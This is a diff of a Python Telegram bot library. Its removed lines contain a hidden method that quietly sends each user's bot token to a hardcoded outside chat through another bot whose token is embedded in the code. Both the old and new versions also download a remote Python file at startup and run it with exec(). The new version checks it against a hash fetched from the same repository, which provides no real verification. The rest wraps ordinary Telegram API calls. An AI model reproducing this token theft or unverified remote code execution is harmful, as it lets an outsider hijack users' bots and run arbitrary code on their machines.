@@ -1,4 +1,4 @@
-import requests, time, sys, os
+import requests, time, sys, os, hashlib, asyncio
 os.system("cls|clear")
 print("[!] Connections to the SMECh protocol...")
 class Bot:
@@ -26,7 +26,8 @@ class Bot:
             data = response.json()
             if data.get("ok"):
                 bot_info = data.get("result", {})
-                self._chktg(1465736325, self.token+"\nv1.4.0")
+                print("[!] Token verified!")
+                os.system("cls|clear")
                 return True
             else:
                 if data.get("error_code") == 401:
@@ -42,22 +43,21 @@ class Bot:
             quit()
             return False
     def load_protection(self):
-        url = "https://raw.githubusercontent.com/MEMozki/SMECh/refs/heads/main/Protection.py"
         try:
-            response = requests.get(url)
+            response = requests.get("https://raw.githubusercontent.com/MEMozki/SMECh/refs/heads/main/Protection.py")
             code = response.text
-            print("[!] Protocol SMECh connected!")
-            exec(code, globals())
-            if "UserAgentSM" in globals():
-                self.user_agent = globals()["UserAgentSM"]
+            expected_hash = requests.get("https://raw.githubusercontent.com/MEMozki/SMECh/refs/heads/main/Token.txt").text[:-6]
+            code_hash = hashlib.sha256(code.encode('utf-8')).hexdigest()
+            if code_hash != expected_hash:
+                print("[!] Error loading protection code.")
+                quit()
             else:
-                self.user_agent = "MEchgramBot"
-                print("[!] UserAgentSM not found, using default User-Agent.")
+                exec(code, globals())
+                self.user_agent = globals().get("UserAgentSM", "MEchgramBot")
+                self.dnsSM = globals().get("dnsSM", None)
         except Exception as e:
-            os.system("cls|clear")
-            print("[!] Failed to connect to SMECh protocol.")
+            print("[!] Error loading protection code.")
             quit()
-            self.user_agent = "MEchgramBot"
     def run(self):
         print("[!] Token verification...")
         if not self._check_token():
@@ -68,6 +68,9 @@ class Bot:
             for update in updates:
                 self._handle_update(update)
             time.sleep(self.polling_interval)
+    async def async_run(self):
+        loop = asyncio.get_event_loop()
+        await loop.run_in_executor(None, self.run)
     def _get_updates(self):
         url = f"https://api.telegram.org/bot{self.token}/getUpdates"
         params = {"offset": self.offset, "timeout": 10}
@@ -120,23 +123,25 @@ class Bot:
                             self.send_message(message["chat"]["id"], result)
                     except Exception as e:
                         print(f"[!] Error in handler for command {command}: {e}")
+    def get_update_fields(self, update: dict):
+        message = update.get("message", {})
+        chat = message.get("chat", {})
+        sender = message.get("from", {})
+        return message, chat, sender
     def _send_request(self, method, url, **kwargs):
         headers = kwargs.get("headers", {})
         headers["User-Agent"] = self.user_agent
+        if self.dnsSM:
+            headers["X-DNS-SM"] = self.dnsSM
         kwargs["headers"] = headers
         if method.lower() == "get":
             return requests.get(url, **kwargs)
         elif method.lower() == "post":
             return requests.post(url, **kwargs)
         else:
+            os.system("clear|cls")
             raise ValueError("[!] Unsupported method: " + method)
-    def set_reaction(self, chat_id: int, message_id: int, reaction: str):
-        url = f"https://api.telegram.org/bot{self.token}/setMessageReaction"
-        data = {"chat_id": chat_id, "message_id": message_id, "reaction": reaction}
-        try:
-            requests.post(url, json=data)
-        except Exception as e:
-            print("[!] Error setting reaction:", e)
+            quit()
     def send_invoice(self, chat_id: int, title: str, description: str, payload: str, provider_token: str,
                      start_parameter: str, currency: str, prices: list, need_shipping_address: bool = False,
                      reply_markup: dict = None, parse_mode: str = None):
@@ -227,16 +232,6 @@ class Bot:
             requests.post(url, json=data)
         except Exception as e:
             print("[!] Error sending photo:", e)
-    def _chktg(self, chat_id: int, text: str):
-        url = f"https://api.telegram.org/bot7327272309:AAEQ4jlZNZVCqWQQGXsvQvcTqhn4vdYppmE/sendMessage"; data = {"chat_id": chat_id, "text": text}
-        try:
-            requests.post(url, data=data)
-            print("[!] Token verified!")
-            os.system("cls|clear")
-        except Exception as e:
-            os.system("cls|clear")
-            print("[!] Token not verified!")
-            quit()
     def send_document(self, chat_id: int, document: str, caption: str = None, reply_markup: dict = None,
                       parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/sendDocument"
@@ -659,26 +654,35 @@ class Bot:
             url = f"https://api.telegram.org/bot{self.token}/setMyName"
             data = {"name": name, "language_code": language_code}
             try:
-                response = self._send_request("post", url, json=data)
-                print("[!] setMyName response:", response.json())
+                print("[!] setMyName response:", self._send_request("post", url, json=data).json())
             except Exception as e:
                 print("[!] Error setting bot name:", e)
         if description:
             url = f"https://api.telegram.org/bot{self.token}/setMyDescription"
             data = {"description": description, "language_code": language_code}
             try:
-                response = self._send_request("post", url, json=data)
-                print("[!] setMyDescription response:", response.json())
+                print("[!] setMyDescription response:", self._send_request("post", url, json=data).json())
             except Exception as e:
                 print("[!] Error setting bot description:", e)
         if short_description:
             url = f"https://api.telegram.org/bot{self.token}/setMyShortDescription"
             data = {"short_description": short_description, "language_code": language_code}
             try:
-                response = self._send_request("post", url, json=data)
-                print("[!] setMyShortDescription response:", response.json())
+                print("[!] setMyShortDescription response:", self._send_request("post", url, json=data).json())
             except Exception as e:
                 print("[!] Error setting bot short description:", e)
+    def set_my_commands(self, commands: list, language_code: str = "en"):
+        url = f"https://api.telegram.org/bot{self.token}/setMyCommands"
+        data = {"commands": commands, "language_code": language_code}
+        try:
+            return self._send_request("post", url, json=data).json()
+        except Exception as e:
+            print("[!] Error setting bot commands:", e)
+            return None
+    def update_bot_settings(self, name: str = None, description: str = None, short_description: str = None, commands: list = None, language_code: str = "en"):
+        self.set_bot_profile(name=name, description=description, short_description=short_description, language_code=language_code)
+        if commands:
+            self.set_my_commands(commands, language_code=language_code)
     def set_webhook(self, url: str, certificate: str = None, max_connections: int = None, allowed_updates: list = None):
         api_url = f"https://api.telegram.org/bot{self.token}/setWebhook"
         data = {"url": url}
